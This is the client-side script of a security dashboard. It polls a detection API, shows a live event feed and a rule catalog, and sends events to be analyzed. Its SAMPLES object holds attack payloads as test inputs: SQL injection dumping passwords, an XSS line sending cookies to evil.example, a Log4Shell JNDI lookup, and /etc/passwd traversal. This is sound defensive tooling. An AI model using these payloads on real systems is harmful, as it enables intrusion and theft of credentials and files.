// Threat Detection: live overview polling + explainable event analysis.
(() => {
    const API = `${API_ORIGIN}/api`;
    const POLL_MS = 5000;
    const MAX_BACKOFF_MS = 60000;
    const FEED_LIMIT = 50;
    const MAX_INPUT = 10000;

    const SAMPLES = {
        sqli: { type: "request", data: "GET /products?id=1%27%20UNION%20SELECT%20username,password%20FROM%20users-- HTTP/1.1\nHost: shop.example.com\nUser-Agent: sqlmap/1.7.2" },
        xss: { type: "url", data: "https://app.example.com/search?q=<script>fetch('//evil.example/c?'+document.cookie)</script>" },
        jndi: { type: "request", data: "GET / HTTP/1.1\nHost: api.example.com\nX-Api-Version: ${jndi:ldap://203.0.113.7:1389/a}" },
        traversal: { type: "request", data: "GET /download?file=..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1\nHost: files.example.com" },
        brute: { type: "log", data: "Nov  7 02:14:51 web01 sshd[2231]: Failed password for invalid user admin from 198.51.100.23 port 52344 ssh2\nNov  7 02:14:53 web01 sshd[2231]: Failed password for invalid user admin from 198.51.100.23 port 52344 ssh2" },
        benign: { type: "request", data: "GET /api/v1/products?page=2&sort=price HTTP/1.1\nHost: shop.example.com\nUser-Agent: Mozilla/5.0" },
    };

    const $ = id => document.getElementById(id);
    const el = (tag, className, text) => {
        const node = document.createElement(tag);
        if (className) node.className = className;
        if (text !== undefined && text !== null) node.textContent = text;
        return node;
    };
    const fmt = new Intl.NumberFormat();

    const state = {
        rules: new Map(),
        events: [],
        latestId: 0,
        paused: false,
        levelFilter: "",
        failures: 0,
        timer: null,
        inFlight: false,
        expanded: new Set(),
        loaded: false,
    };

    // ---------- helpers ----------
    function toast(message, kind = "info") {
        const node = $("toast");
        node.textContent = message;
        node.dataset.kind = kind;
        node.hidden = false;
        clearTimeout(toast.timer);
        toast.timer = setTimeout(() => { node.hidden = true; }, 4000);
    }

    function relativeTime(iso) {
        const seconds = Math.round((Date.now() - new Date(iso).getTime()) / 1000);
        if (!Number.isFinite(seconds)) return "";
        if (seconds < 10) return "just now";
        if (seconds < 60) return `${seconds}s ago`;
        if (seconds < 3600) return `${Math.floor(seconds / 60)}m ago`;
        if (seconds < 86400) return `${Math.floor(seconds / 3600)}h ago`;
        return new Date(iso).toLocaleDateString();
    }

    function levelClass(level) {
        return `lvl-${String(level || "low").toLowerCase()}`;
    }

    function ruleName(id) {
        return state.rules.get(id)?.name || id.replace(/_/g, " ").toLowerCase();
    }

    function setLiveStatus(kind, text) {
        $("liveStatus").dataset.state = kind;
        $("liveStatusText").textContent = text;
    }

    async function readJson(response) {
        const data = await response.json().catch(() => ({}));
        if (!response.ok || data.success === false) {
            const error = new Error(data.error || `Request failed (${response.status})`);
            error.status = response.status;
            throw error;
        }
        return data;
    }

    // ---------- account ----------
    async function loadAccount() {
        try {
            const data = await readJson(await apiFetch(`${API}/auth/me`));
            if (data.user?.full_name) $("accountName").textContent = data.user.full_name;
        } catch (_) { /* apiFetch redirects on 401 */ }
    }

    $("logoutLink").addEventListener("click", async event => {
        event.preventDefault();
        try { await apiFetch(`${API}/auth/logout`, { method: "POST" }); } catch (_) { /* ignore */ }
        sessionStorage.removeItem("cyberSentinelCsrf");
        window.location.href = "login.html";
    });

    // ---------- rule catalog ----------
    async function loadRules() {
        try {
            const data = await readJson(await apiFetch(`${API}/detection/rules`));
            const body = $("catalogBody");
            body.replaceChildren();
            data.rules.forEach(rule => {
                state.rules.set(rule.id, rule);
                const row = document.createElement("tr");
                const nameCell = el("td");
                nameCell.append(el("strong", null, rule.name), el("code", "rule-id", rule.id), el("p", "muted", rule.description));
                const mitreCell = el("td");
                mitreCell.append(externalLink(`https://attack.mitre.org/techniques/${rule.mitre.replace(".", "/")}/`, rule.mitre),
                    el("p", "muted", rule.mitre_name));
                const cweCell = el("td");
                const cweNumber = rule.cwe.match(/CWE-(\d+)/)?.[1];
                cweCell.append(cweNumber
                    ? externalLink(`https://cwe.mitre.org/data/definitions/${cweNumber}.html`, rule.cwe)
                    : el("span", "muted", rule.cwe));
                row.append(nameCell, el("td", null, rule.category), el("td", "num", `+${rule.weight}`), mitreCell, cweCell);
                body.appendChild(row);
            });
            if (window.location.hash === "#rules") {
                $("ruleCatalog").open = true;
                $("rules").scrollIntoView({ block: "start" });
            }
            $("catalogCount").textContent = `${data.rules.length} active rules · ${data.engine.name} v${data.engine.version}`;
            renderFeed();
        } catch (error) {
            $("catalogCount").textContent = "Rule catalog unavailable";
        }
    }

    function externalLink(href, text) {
        const link = el("a", "ext", text);
        link.href = href;
        link.target = "_blank";
        link.rel = "noopener noreferrer";
        return link;
    }

    // ---------- live overview ----------
    function renderKpis(overview) {
        const levels = overview.by_risk_level_24h;
        $("kpiEvents").textContent = fmt.format(overview.events_24h);
        $("kpiDetections").textContent = fmt.format(overview.detections_24h);
        const rate = overview.events_24h ? Math.round((overview.detections_24h / overview.events_24h) * 100) : 0;
        $("kpiRate").textContent = `Detection rate ${rate}%`;
        $("kpiSevere").textContent = `${fmt.format(levels.CRITICAL)} / ${fmt.format(levels.HIGH)}`;
        $("kpiMaxScore").textContent = `Peak score ${overview.max_score_24h}/100`;
        $("kpiEngine").textContent = `v${overview.engine.version}`;
        $("kpiRules").textContent = `${overview.engine.rule_count} rules · decoding enabled`;
    }

    function renderBars(listId, items, labelFn, emptyText) {
        const list = $(listId);
        list.replaceChildren();
        if (!items.length) {
            list.appendChild(el("li", "empty", emptyText));
            return;
        }
        const max = Math.max(...items.map(item => item.count));
        items.forEach(item => {
            const li = el("li");
            const label = el("div", "bar-label");
            label.append(el("span", null, labelFn(item)), el("strong", null, fmt.format(item.count)));
            const track = el("div", "bar-track");
            const fill = el("div", "bar-fill");
            fill.style.width = `${Math.max(4, (item.count / max) * 100)}%`;
            track.appendChild(fill);
            li.append(label, track);
            list.appendChild(li);
        });
    }

    function mergeEvents(incoming, isInitial) {
        if (!incoming.length) return;
        const known = new Set(state.events.map(event => event.id));
        const fresh = incoming.filter(event => !known.has(event.id));
        fresh.forEach(event => { event._new = !isInitial; });
        state.events = [...fresh, ...state.events].sort((a, b) => b.id - a.id).slice(0, FEED_LIMIT);
        if (!isInitial) {
            const severe = fresh.filter(event => ["CRITICAL", "HIGH"].includes(event.risk_level));
            if (severe.length) toast(`${severe.length} new high-severity detection${severe.length > 1 ? "s" : ""}`, "danger");
        }
    }

    function renderFeed() {
        const feed = $("feed");
        feed.replaceChildren();
        const items = state.events.filter(event => !state.levelFilter || event.risk_level === state.levelFilter);
        if (!items.length) {
            const empty = el("li", "empty");
            empty.textContent = state.events.length
                ? "No events at this severity."
                : "No events yet. Analyze an event or send one through an integration key.";
            feed.appendChild(empty);
            return;
        }
        items.forEach(event => {
            const li = el("li", `feed-item ${levelClass(event.risk_level)}${event._new ? " is-new" : ""}`);
            event._new = false;
            const head = el("button", "feed-head");
            head.type = "button";
            head.setAttribute("aria-expanded", String(state.expanded.has(event.id)));
            const badge = el("span", `badge ${levelClass(event.risk_level)}`, `${event.risk_level} ${event.risk_score}`);
            const main = el("span", "feed-main");
            const title = event.matched_rules.length
                ? event.matched_rules.map(ruleName).join(", ")
                : "No indicator matched";
            main.append(el("strong", null, title), el("span", "muted", `${event.source} · ${event.event_type}`));
            const time = el("time", "muted", relativeTime(event.received_at));
            time.dateTime = event.received_at;
            time.title = new Date(event.received_at).toLocaleString();
            head.append(badge, main, time);

            const body = el("div", "feed-body");
            body.hidden = !state.expanded.has(event.id);
            body.append(el("pre", null, event.event_data));
            const actions = el("div", "feed-actions");
            if (event.alert_id) {
                const link = el("a", null, `Alert #${event.alert_id} · ${event.alert_status}`);
                link.href = "security-alerts.html";
                actions.appendChild(link);
            }
            const reanalyze = el("button", "link-btn", "Load into analyzer");
            reanalyze.type = "button";
            reanalyze.addEventListener("click", () => {
                $("eventInput").value = event.event_data;
                updateCharCount();
                $("eventInput").focus();
                $("eventInput").scrollIntoView({ behavior: "smooth", block: "center" });
            });
            actions.appendChild(reanalyze);
            body.appendChild(actions);

            head.addEventListener("click", () => {
                const open = body.hidden;
                body.hidden = !open;
                head.setAttribute("aria-expanded", String(open));
                open ? state.expanded.add(event.id) : state.expanded.delete(event.id);
            });
            li.append(head, body);
            feed.appendChild(li);
        });
    }

    async function poll() {
        if (state.inFlight) return;
        state.inFlight = true;
        const isInitial = !state.loaded;
        try {
            const url = `${API}/detection/overview?limit=25&since_id=${state.latestId}`;
            const { overview } = await readJson(await apiFetch(url));
            state.failures = 0;
            renderKpis(overview);
            renderBars("topRules", overview.top_rules, item => ruleName(item.rule_id), "No indicators matched in the last 24 hours.");
            renderBars("topSources", overview.top_sources, item => item.source, "No sources with detections yet.");
            mergeEvents(overview.events, isInitial);
            state.latestId = Math.max(state.latestId, overview.latest_id);
            state.loaded = true;
            renderFeed();
            setLiveStatus("live", `Live · updated ${new Date().toLocaleTimeString()}`);
        } catch (error) {
            state.failures += 1;
            setLiveStatus("error", error.status === 429 ? "Rate limited · retrying" : "API unreachable · retrying");
        } finally {
            state.inFlight = false;
            schedule();
        }
    }

    function schedule() {
        clearTimeout(state.timer);
        if (state.paused || document.hidden) return;
        const delay = state.failures
            ? Math.min(MAX_BACKOFF_MS, POLL_MS * 2 ** state.failures)
            : POLL_MS;
        state.timer = setTimeout(poll, delay);
    }

    $("pauseBtn").addEventListener("click", () => {
        state.paused = !state.paused;
        $("pauseBtn").textContent = state.paused ? "Resume" : "Pause";
        $("pauseBtn").setAttribute("aria-pressed", String(state.paused));
        if (state.paused) {
            clearTimeout(state.timer);
            setLiveStatus("paused", "Paused");
        } else {
            poll();
        }
    });

    document.querySelectorAll(".feed-filters .filter").forEach(button => {
        button.addEventListener("click", () => {
            document.querySelectorAll(".feed-filters .filter").forEach(other => other.classList.remove("active"));
            button.classList.add("active");
            state.levelFilter = button.dataset.level;
            renderFeed();
        });
    });

    document.addEventListener("visibilitychange", () => {
        if (document.hidden) {
            clearTimeout(state.timer);
        } else if (!state.paused) {
            poll();
        }
    });

    // Keep relative timestamps fresh without hitting the API.
    setInterval(() => {
        document.querySelectorAll(".feed time").forEach(node => {
            node.textContent = relativeTime(node.dateTime);
        });
    }, 15000);

    // ---------- analyzer ----------
    const form = $("analyzeForm");
    const input = $("eventInput");
    const typeSelect = $("eventType");
    const analyzeBtn = $("analyzeBtn");

    function updateCharCount() {
        const length = input.value.length;
        $("charCount").textContent = `${fmt.format(length)} / ${fmt.format(MAX_INPUT)}`;
        $("charCount").classList.toggle("over", length > MAX_INPUT * 0.9);
        const warning = $("inputWarning");
        const value = input.value.trim();
        if (typeSelect.value === "url" && value && !/^https?:\/\//i.test(value)) {
            warning.textContent = "Doesn't look like a full http(s) URL — it will still be analyzed.";
            warning.hidden = false;
        } else {
            warning.hidden = true;
        }
    }

    function showFormError(message) {
        $("formError").textContent = message;
        $("formError").hidden = !message;
    }

    function renderResult(result, alertId) {
        // Older API builds return matched_rules without per-rule findings.
        if (!Array.isArray(result.findings)) {
            result.findings = (result.matched_rules || []).map(id => {
                const rule = state.rules.get(id) || {};
                return {
                    rule_id: id, name: rule.name || ruleName(id), category: rule.category || "Indicator",
                    weight: rule.weight || 0, mitre: rule.mitre || "", cwe: rule.cwe || "",
                    description: rule.description || "Matched a configured indicator.",
                    remediation: rule.remediation || result.recommendation,
                    decoded: false, match_count: 0, evidence: [],
                };
            });
            toast("Backend is running an older version — restart it for evidence and MITRE details.", "danger");
        }
        result.engine = result.engine || "rules";
        const panel = $("resultPanel");
        panel.hidden = false;
        const level = result.risk_level;
        $("scoreRing").style.setProperty("--score", result.risk_score);
        $("scoreRing").className = `score-ring ${levelClass(level)}`;
        $("scoreValue").textContent = result.risk_score;
        $("riskBadge").textContent = level;
        $("riskBadge").className = `badge ${levelClass(level)}`;
        $("verdictTitle").textContent = result.findings.length
            ? `${result.findings.length} indicator${result.findings.length > 1 ? "s" : ""} matched`
            : "No configured indicator matched";
        $("recommendation").textContent = result.recommendation;
        $("resultMeta").textContent = `${result.engine} · ${new Date().toLocaleTimeString()}`;

        const alertLink = $("alertLink");
        alertLink.replaceChildren();
        if (alertId) {
            alertLink.append("Alert ");
            const link = el("a", null, `#${alertId}`);
            link.href = "security-alerts.html";
            alertLink.append(link, " was opened for triage.");
        } else {
            alertLink.textContent = "No alert created — event recorded for history.";
        }

        const container = $("findings");
        container.replaceChildren();
        if (!result.findings.length) {
            container.appendChild(el("p", "empty", "The event did not match any active rule. Rule-based detection cannot rule out novel or obfuscated attacks."));
        }
        result.findings.forEach(finding => {
            const card = el("article", "finding");
            const header = el("div", "finding-head");
            const titleWrap = el("div");
            titleWrap.append(el("h4", null, finding.name), el("code", "rule-id", finding.rule_id));
            const tags = el("div", "tags");
            tags.append(el("span", "tag", finding.category), el("span", "tag weight", `+${finding.weight}`));
            if (finding.mitre) tags.appendChild(externalLink(`https://attack.mitre.org/techniques/${finding.mitre.replace(".", "/")}/`, finding.mitre));
            const cweNumber = String(finding.cwe || "").match(/CWE-(\d+)/)?.[1];
            if (cweNumber) tags.appendChild(externalLink(`https://cwe.mitre.org/data/definitions/${cweNumber}.html`, finding.cwe));
            if (finding.decoded) tags.appendChild(el("span", "tag decoded", finding.decoding));
            [...tags.querySelectorAll("a")].forEach(link => link.classList.add("tag"));
            header.append(titleWrap, tags);

            const evidence = el("div", "evidence");
            evidence.hidden = !finding.evidence.length;
            evidence.appendChild(el("span", "label", `Evidence${finding.match_count > 1 ? ` (${finding.match_count} matches)` : ""}`));
            finding.evidence.forEach(item => {
                const line = el("pre");
                line.append(item.before, el("mark", null, item.match), item.after);
                evidence.appendChild(line);
            });

            const why = el("p", "finding-text");
            why.append(el("strong", null, "Why it matters: "), finding.description);
            const fix = el("p", "finding-text");
            fix.append(el("strong", null, "Remediation: "), finding.remediation);
            card.append(header, evidence, why, fix);
            container.appendChild(card);
        });
        panel.scrollIntoView({ behavior: "smooth", block: "start" });
    }

    form.addEventListener("submit", async event => {
        event.preventDefault();
        showFormError("");
        const value = input.value.trim();
        if (!value) {
            showFormError("Enter event data to analyze.");
            input.focus();
            return;
        }
        if (value.length > MAX_INPUT) {
            showFormError("Event data must be 10,000 characters or fewer.");
            return;
        }
        analyzeBtn.disabled = true;
        analyzeBtn.textContent = "Analyzing…";
        try {
            const data = await readJson(await apiFetch(`${API}/assess-risk`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ event_data: value, event_type: typeSelect.value }),
            }));
            try {
                renderResult(data.result, data.alert_id);
            } catch (renderError) {
                console.error(renderError);
                throw new Error("the result could not be displayed (see browser console)");
            }
            poll(); // surface the new event in the feed immediately
        } catch (error) {
            showFormError(error.status === 429
                ? "Too many analyses in a short time. Wait a moment and try again."
                : `Could not analyze the event: ${error.message}`);
        } finally {
            analyzeBtn.disabled = false;
            analyzeBtn.textContent = "Analyze Event";
        }
    });

    input.addEventListener("input", updateCharCount);
    typeSelect.addEventListener("change", updateCharCount);
    input.addEventListener("keydown", event => {
        if (event.key === "Enter" && (event.ctrlKey || event.metaKey)) form.requestSubmit();
    });

    $("clearBtn").addEventListener("click", () => {
        input.value = "";
        typeSelect.value = "general";
        $("resultPanel").hidden = true;
        showFormError("");
        updateCharCount();
        input.focus();
    });

    $("samples").addEventListener("click", event => {
        const key = event.target.dataset?.sample;
        if (!key) return;
        input.value = SAMPLES[key].data;
        typeSelect.value = SAMPLES[key].type;
        updateCharCount();
        input.focus();
    });

    // ---------- boot ----------
    updateCharCount();
    loadAccount();
    loadRules();
    poll();
})();
